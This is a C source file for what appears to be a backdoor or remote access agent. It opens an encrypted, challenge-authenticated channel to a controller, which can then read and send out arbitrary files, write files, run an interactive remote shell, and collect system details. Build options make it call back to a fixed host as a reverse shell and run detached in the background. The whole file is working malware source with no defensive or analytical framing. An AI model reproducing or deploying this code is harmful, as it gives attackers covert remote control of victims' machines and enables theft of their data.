#include <pty.h>
#include <sys/wait.h>
#include "app.h"
#include "connection.h"

char send_msg_buf[MSGSIZE + 5], recv_msg_buf[MSGSIZE + 5];
int send_msg_len, recv_msg_len;	

int init_server(){
	byte IV[40];
	byte *IV1 = IV;
	byte *IV2 = IV + 20;
	recv_data(IV, 40, 0);
#ifdef DEBUG
	printf("[+]: The key: ");
	for(int i = 0; i < 40; ++i)
		printf("%02x ", IV[i]);
	printf("\n");
#endif
	setup_context(&send_ctx, key, IV2);
	setup_context(&recv_ctx, key, IV1);
	recv_msg(recv_msg_buf, &recv_msg_len);
	if(recv_msg_len != 16 || memcmp(recv_msg_buf, challenge, 0x10)) return 8;
	send_msg(challenge, 0x10);
	return 0;
}

int get_file(){
	int fd;
	int sum = 0;
	char response;
	struct stat s_buf;
	recv_msg(recv_msg_buf, &recv_msg_len);	//file path
	if(recv_msg_len == 1 && recv_msg_buf[0] == 0) return 12;
	recv_msg_buf[recv_msg_len] = '\0';
	stat(recv_msg_buf, &s_buf);
	if(!S_ISREG(s_buf.st_mode)){
		send_msg_buf[0] = 0;
		send_msg(send_msg_buf, 1);
		return 11;
	}
	else{
		send_msg_buf[0] = 1;
		send_msg(send_msg_buf, 1);
	}
#ifdef DEBUG
	printf("[+]: file path: %s\n", recv_msg_buf);
#endif
	//can't find the specify file case
	if((fd = open(recv_msg_buf, O_RDONLY)) < 0) return 19;
	while(1){
		send_msg_len = read(fd, send_msg_buf, BUFSIZE);
		if(send_msg_len <= 0) break;
		send_msg(send_msg_buf, send_msg_len);
		sum += send_msg_len;
	}
#ifdef DEBUG
	printf("[+]: Send %d bytes\n", sum);
#endif
	close(fd);
	return 0;
}

int put_file(){
	int fd;
	int sum = 0;
	char flag;
	recv_msg(recv_msg_buf, &recv_msg_len);	//file path
	if(recv_msg_len == 1 && recv_msg_buf[0] == 0) return 11;
	recv_msg_buf[recv_msg_len] = '\0';
#ifdef DEBUG
	printf("[+]: File path: %s\n", recv_msg_buf);
#endif
	if((fd = creat(recv_msg_buf, 0644)) < 0){
		send_msg_buf[0] = 0;
		send_msg(send_msg_buf, 1);
		return 14;
	}
	else{
		send_msg_buf[1] = 1;
		send_msg(send_msg_buf, 1);
	}
	while(1){
		recv_msg(recv_msg_buf, &recv_msg_len);
		if(recv_msg_len <= 0) break;
		write(fd, recv_msg_buf, recv_msg_len);
		sum += recv_msg_len;
	}
#ifdef DEBUG
	printf("[+]: Receive %d bytes\n", sum);
#endif
	close(fd);
	return 0;
}

int run_shell(){
	fd_set rd;
	int pty, tty, pid;
	int tmp;
	if(openpty(&pty, &tty, NULL, NULL, NULL ) < 0)
		return false;
	recv_msg(recv_msg_buf, &recv_msg_len);
	recv_msg_buf[recv_msg_len] = '\0';
	if(recv_msg_len <= 0) return 18;
	pid = fork();
	if(pid < 0) return false;
	if(pid){
		close(tty);
		while(1){
			FD_ZERO(&rd);
			FD_SET(client, &rd);
			FD_SET(pty, &rd);
			tmp = (pty >= client ? pty : client);
			if(select(tmp + 1, &rd, NULL, NULL, NULL) < 0)
				return false;
			if(FD_ISSET(client, &rd)){
				recv_msg(recv_msg_buf, &recv_msg_len);
				if(recv_msg_len <= 0) break;
				write(pty, recv_msg_buf, recv_msg_len);
			}
			if(FD_ISSET(pty, &rd)){
				send_msg_len = read(pty, send_msg_buf, MSGSIZE);	//message length should less than BUFSIZEp
				if(send_msg_len <= 0) break;
				send_msg(send_msg_buf, send_msg_len);
			}
		}
		//printf("here\n");
	}
	else{
		close(client);
		close(server);
		close(pty);
		if(setsid() < 0) return false;
		if( ioctl( tty, TIOCSCTTY, NULL ) < 0) return false;
		dup2( tty, 0 );
		dup2( tty, 1 );
		dup2( tty, 2 );
		if( tty > 2 ) close( tty );
		execl("/bin/sh", "sh", "-c", recv_msg_buf, (char *)0);
		exit(0);
	}
	return 0;
}

int sysinfo(){
	struct sockaddr_in addr;
	struct utsname uts;
	socklen_t addr_len = sizeof(struct sockaddr_in);
	/* get socket ip*/
	getsockname(client, (struct sockaddr*)&addr, &addr_len);
	memcpy(send_msg_buf, &addr.sin_addr, 4);
	uname(&uts);
	memcpy(send_msg_buf + 4, &uts, 390);
	send_msg(send_msg_buf, 394);
	//printf("IP address: \t%s\n", inet_ntoa(addr.sin_addr));
	//printf("sysname: \t%s\n", uts.sysname);
	//printf("nodename: \t%s\n", uts.nodename);
	//printf("release: \t%s\n", uts.release);
	//printf("version: \t%s\n", uts.version);
	//printf("machine: \t%s\n", uts.machine);
	return 0;
}

int service(){
	struct sockaddr_in addr;
	socklen_t addr_len = sizeof(struct sockaddr);
	char command_msg;
	int cmd_msg_len;
	int pid;
	int ret;
	while(1){
#ifndef REVERSE
		if((client = accept(server, (struct sockaddr *)&addr, &addr_len)) < 0){
			close(server);
			return 17;
		}
		pid = fork();
		if(pid < 0){
			close(client);
			continue;
		}
		if(pid > 0){
			waitpid(pid, NULL, 0);
			close(client);
			continue;
		}
		close(server);
#else
		sleep(30);
		if((client = socket(AF_INET, SOCK_STREAM, 0)) < 0)
			continue;
		memset(&addr, 0, sizeof(addr));
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = host;
		addr.sin_port = htons(port);
		if(connect(client, (struct sockaddr *)&addr, sizeof(addr)) < 0){
			close( client );
			continue;
		}
#endif
		if(ret = init_server()) return ret;
		recv_msg(&command_msg, &cmd_msg_len);
		if(cmd_msg_len <= 0) return 18;
		switch(command_msg){
			case GET_FILE:ret = get_file();break;
			case PUT_FILE:ret = put_file();break;
			case RUN_SHELL:ret = run_shell();break;
			case SYSINFO:ret = sysinfo(); break;
			default:;
		}
		shutdown(client, 2);
		return ret;
	}
	return 0;
}

void usage(){
	printf("\t-h host\tIp address.\n");
	printf("\t-p port\tListen port.\n");
	printf("\t-u\tPrint help message.");
	exit(0);
}

int main(int argc, char *argv[]){
	int ch, pid, i;
	int ret;
#ifdef BACKGROUND
	pid = fork();
	if(pid < 0) return -1;
	if(pid > 0) return 0;
	if(setsid() < 0) return -1;
	for(i = 0; i < 1024; ++i) close(i);
#endif
	while((ch = getopt(argc, argv, "h:p:u")) != -1){
		switch(ch){
			case 'h':
				if((host = inet_addr(optarg)) == INADDR_NONE){
					ret = 1; EXIT;
				}
				break;
			case 'p':
				if((port = atoi(optarg)) == 0){
					ret = 2; EXIT;
				}
				break;
			case 'u':
				usage(); break;
			default:
				printf("Existence of unidentified parameters\n");
				exit(0);
		}
	}
#ifndef REVERSE
	if(ret = create_server_socket()) EXIT;
#endif
	if(ret = service()) EXIT;
#ifndef REVERSE
	close(server);
#endif
	return 0;
catch:	handle_error(ret);
	return 0;
}
